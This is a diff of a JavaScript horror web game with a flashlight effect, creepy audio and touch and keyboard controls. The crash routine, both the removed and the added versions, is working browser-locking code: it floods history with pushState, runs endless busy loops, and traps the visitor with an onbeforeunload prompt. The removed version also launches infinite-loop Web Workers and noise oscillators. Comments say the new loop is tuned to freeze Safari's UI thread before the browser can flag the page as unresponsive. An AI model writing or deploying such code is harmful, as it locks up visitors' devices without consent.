@@ -5,195 +5,141 @@ let mouseX = window.innerWidth / 2;
 let mouseY = window.innerHeight / 2;
 let systemCrashed = false;
 
-// 用於手機拖拽的變數
+// 手機拖拽變數
 let isDragging = false;
-let lastTouchX = 0;
-let lastTouchY = 0;
+let lastX = 0, lastY = 0;
 
 const map = document.getElementById('map');
 const overlay = document.getElementById('flashlight-overlay');
 const intro = document.getElementById('intro');
 
-// --- 核心啟動函式 (PC 鍵盤或手機點擊皆可) ---
-function startGame() {
-    if (systemCrashed || audioStarted) return;
-    
-    // 1. 隱藏 Intro 文字
-    if (intro) intro.style.display = 'none';
-    
-    // 2. 請求全屏 (手機必備，用來隱藏瀏覽器工具欄)
-    const el = document.documentElement;
-    if (el.requestFullscreen) el.requestFullscreen().catch(()=>{});
-    else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen().catch(()=>{});
-    
-    // 3. 啟動聲音與手電筒
-    startCreepyVoice();
-    isLightOn = true;
-    
-    // 初始化手電筒位置
-    updateFlashlight(mouseX, mouseY);
-}
-
-// 1. 音效系統
-function startCreepyVoice() {
+// 1. 修復手機音援 (需要 User Gesture)
+function initAudio() {
     if (audioStarted) return;
-    const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+    const AudioContext = window.AudioContext || window.webkitAudioContext;
+    const audioCtx = new AudioContext();
+    
+    // 建立一個持續嘅低頻 Glitch 聲
     const scriptNode = audioCtx.createScriptProcessor(4096, 1, 1);
     let t = 0;
-
     scriptNode.onaudioprocess = (e) => {
         const output = e.outputBuffer.getChannelData(0);
         for (let i = 0; i < output.length; i++) {
             if (systemCrashed) {
-                output[i] = (Math.random() * 2 - 1) * 0.9;
+                // 鎖死後嘅噪音
+                output[i] = (Math.random() * 2 - 1) * 0.8;
             } else {
-                let n = Math.random() * 0.1;
-                let g = (t & (t >> 8)) ? 0.05 : -0.05;
-                output[i] = n + g;
+                // 鎖死前嘅微弱呼吸聲
+                output[i] = (Math.random() * 0.05) + (Math.sin(t * 0.001) * 0.02);
             }
             t++;
         }
     };
     scriptNode.connect(audioCtx.destination);
+    
+    // 如果係 iOS，需要 resume context
+    if (audioCtx.state === 'suspended') audioCtx.resume();
     audioStarted = true;
 }
 
-// 2. 生成 Glitch 塊 (30秒後出現)
-setTimeout(() => {
-    if (systemCrashed) return;
-    const glitchBlock = document.createElement('div');
+// 2. 統一啟動函式 (PC/手機通用)
+function startExperience() {
+    if (intro) intro.style.display = 'none';
     
-    // 將方塊生成在當前視線中心附近
-    let spawnX = -posX + (window.innerWidth / 2) + 100;
-    let spawnY = -posY + (window.innerHeight / 2) + 100;
+    // 請求全屏 (隱藏 UI)
+    const el = document.documentElement;
+    if (el.requestFullscreen) el.requestFullscreen().catch(()=>{});
+    else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen().catch(()=>{});
 
-    glitchBlock.style.cssText = `
-        position: absolute; width: 40px; height: 40px;
-        background: white; z-index: 1001;
-        left: ${spawnX}px; top: ${spawnY}px;
-        box-shadow: 0 0 25px white;
-    `;
-    map.appendChild(glitchBlock);
-
-    setInterval(() => {
-        glitchBlock.style.background = Math.random() > 0.5 ? 'white' : 'black';
-    }, 50);
-
-    const checkArrival = setInterval(() => {
-        const rect = glitchBlock.getBoundingClientRect();
-        const centerX = window.innerWidth / 2;
-        const centerY = window.innerHeight / 2;
-        // 判定撞擊
-        if (Math.abs(rect.left + 20 - centerX) < 50 && Math.abs(rect.top + 20 - centerY) < 50) {
-            triggerFinalCrash();
-            clearInterval(checkArrival);
-        }
-    }, 50);
-}, 30000);
-
-// 3. 核心：0.3秒絕殺凍結
-function triggerFinalCrash() {
-    systemCrashed = true;
-    window.onbeforeunload = function () { return "HELP ME."; };
-
-    document.body.innerHTML = `
-        <div style="background:black; color:red; width:100vw; height:100vh; display:flex; justify-content:center; align-items:center; position:fixed; top:0; left:0; z-index:99999; cursor:none;">
-            <h1 style="font-size:15vw; font-family:serif; text-shadow:0 0 50px red;">HELP ME.</h1>
-        </div>
-    `;
-
-    setTimeout(() => {
-        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-        setInterval(() => {
-            let osc = audioCtx.createOscillator();
-            osc.type = 'sawtooth';
-            osc.frequency.value = 40 + Math.random() * 4000;
-            osc.connect(audioCtx.destination);
-            osc.start();
-        }, 15);
-
-        function absoluteLock() {
-            for (let i = 0; i < 400; i++) {
-                window.history.pushState(null, null, "#" + Math.random());
-            }
-            const start = Date.now();
-            while (Date.now() - start < 800) {
-                const data = new Array(1000000).fill("DEAD");
-                JSON.stringify(data);
-            }
-            setTimeout(absoluteLock, 0);
-        }
-
-        const blobCode = `while(true){ postMessage(new Array(1000000).join("HELP")); }`;
-        const url = URL.createObjectURL(new Blob([blobCode], { type: 'application/javascript' }));
-        for (let i = 0; i < 48; i++) { new Worker(url); }
-
-        absoluteLock();
-    }, 300);
+    initAudio();
+    isLightOn = true;
+    updateFlashlight(mouseX, mouseY);
 }
 
-// 4. 控制邏輯 (手電筒更新)
+// 3. 全平台移動邏輯 (PC + 手機拖拽)
 function updateFlashlight(x, y) {
     if (isLightOn && !systemCrashed) {
         overlay.style.background = `radial-gradient(circle 130px at ${x}px ${y}px, transparent 0%, rgba(0,0,0,0.99) 100%)`;
     }
 }
 
-// --- 事件監聽 (全平台適配) ---
-
-// PC 滑鼠移動
-window.addEventListener('mousemove', (e) => {
-    mouseX = e.clientX; mouseY = e.clientY;
-    updateFlashlight(mouseX, mouseY);
-});
-
-// PC 鍵盤操作
+// --- 事件監聽 ---
+// PC 鍵盤
 window.addEventListener('keydown', (e) => {
     if (systemCrashed) return;
     let key = e.key.toLowerCase();
-    if (key === 'f') startGame();
-    
+    if (key === 'f') startExperience();
     const s = 60;
     if (key === 'w') posY += s; if (key === 's') posY -= s; if (key === 'a') posX += s; if (key === 'd') posX -= s;
     map.style.transform = `translate(${posX}px, ${posY}px)`;
 });
 
-// 手機/iPad 觸摸操作 (點擊啟動 + 拖拽移動)
+// 手機拖拽 (iPad/iPhone 專用移動)
 window.addEventListener('touchstart', (e) => {
-    if (!audioStarted) startGame(); // 觸摸即啟動
-    
+    if (!audioStarted) startExperience();
     isDragging = true;
-    lastTouchX = e.touches[0].clientX;
-    lastTouchY = e.touches[0].clientY;
-    
-    // 更新手電筒位置到手指觸碰處
-    updateFlashlight(lastTouchX, lastTouchY);
+    lastX = e.touches[0].clientX;
+    lastY = e.touches[0].clientY;
+    updateFlashlight(lastX, lastY);
 }, { passive: false });
 
 window.addEventListener('touchmove', (e) => {
     if (systemCrashed || !isDragging) return;
-    e.preventDefault(); // 防止畫面捲動
-    
-    let touchX = e.touches[0].clientX;
-    let touchY = e.touches[0].clientY;
-    
-    // 計算移動距離
-    let dx = touchX - lastTouchX;
-    let dy = touchY - lastTouchY;
-    
-    posX += dx;
-    posY += dy;
-    
+    e.preventDefault(); // 阻止手機頁面跳動
+    let tx = e.touches[0].clientX;
+    let ty = e.touches[0].clientY;
+    posX += (tx - lastX);
+    posY += (ty - lastY);
     map.style.transform = `translate(${posX}px, ${posY}px)`;
-    updateFlashlight(touchX, touchY);
-    
-    lastTouchX = touchX;
-    lastTouchY = touchY;
+    updateFlashlight(tx, ty);
+    lastX = tx; lastY = ty;
 }, { passive: false });
 
-window.addEventListener('touchend', () => {
-    isDragging = false;
+window.addEventListener('touchend', () => isDragging = false);
+window.addEventListener('mousemove', (e) => {
+    mouseX = e.clientX; mouseY = e.clientY;
+    updateFlashlight(mouseX, mouseY);
 });
 
-// 點擊啟動備份 (針對某些瀏覽器)
-window.addEventListener('click', startGame, { once: true });
+// 4. 0.3 秒「防崩潰」鎖死邏輯 (iPhone/iPad 專用)
+function triggerFinalCrash() {
+    systemCrashed = true;
+    window.onbeforeunload = () => "HELP ME.";
+
+    document.body.innerHTML = `
+        <div style="background:black; color:red; width:100vw; height:100vh; display:flex; justify-content:center; align-items:center; position:fixed; top:0; left:0; z-index:99999;">
+            <h1 style="font-size:15vw; font-family:serif; text-shadow:0 0 50px red;">HELP ME.</h1>
+        </div>
+    `;
+
+    setTimeout(() => {
+        // iOS/Safari 特殊鎖死：唔好塞 RAM，係要塞住 UI Thread
+        function freezeStep() {
+            // 用一個唔會觸發 Memory Crash 嘅大運算
+            let start = Date.now();
+            while (Date.now() - start < 500) {
+                // 同步寫入 History，令 Safari 嘅 UI 卡死
+                window.history.pushState(null, null, "#" + Math.random());
+                // 密集運算，但不分配大內存
+                Math.sqrt(Math.random() * 999999) * Math.atan(Math.random());
+            }
+            // 立即再次呼叫，令瀏覽器冇時間檢查「頁面是否回應」
+            freezeStep();
+        }
+
+        // 啟動噪音爆破
+        initAudio(); 
+        freezeStep();
+    }, 300);
+}
+
+// 模擬生成 Glitch 塊 (測試用改短時間)
+setTimeout(() => {
+    const glitch = document.createElement('div');
+    glitch.style.cssText = `position:absolute; width:40px; height:40px; background:white; left:${-posX + 200}px; top:${-posY + 200}px; z-index:1001;`;
+    map.appendChild(glitch);
+    setInterval(() => {
+        const r = glitch.getBoundingClientRect();
+        if (Math.abs(r.left - window.innerWidth/2) < 50 && Math.abs(r.top - window.innerHeight/2) < 50) triggerFinalCrash();
+    }, 100);
+}, 30000);
